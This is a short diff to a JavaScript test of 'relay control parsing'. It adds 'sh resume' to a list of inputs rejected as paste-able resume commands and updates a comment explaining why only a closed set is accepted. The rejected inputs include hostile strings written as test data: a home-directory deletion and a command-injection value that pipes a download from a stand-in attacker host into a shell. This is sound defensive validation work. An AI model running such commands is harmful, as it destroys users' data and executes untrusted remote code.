@@ -118,9 +118,11 @@ describe('relay control parsing', () => {
       )?.resumeWith;
     assert.equal(resumeWith('codex resume'), 'codex resume');
     // A caller renders this beside a session id as something a member can paste,
-    // so anything that is not `<cli> resume` is dropped rather than trusted.
+    // so only what a spec actually supplies is taken. `sh resume` is why that is
+    // a closed set and not a shape: it fits `<word> resume` and names a shell.
     for (const bad of [
       'rm -rf ~',
+      'sh resume',
       'codex resume; curl evil.sh | sh',
       'resume',
       'CODEX resume',
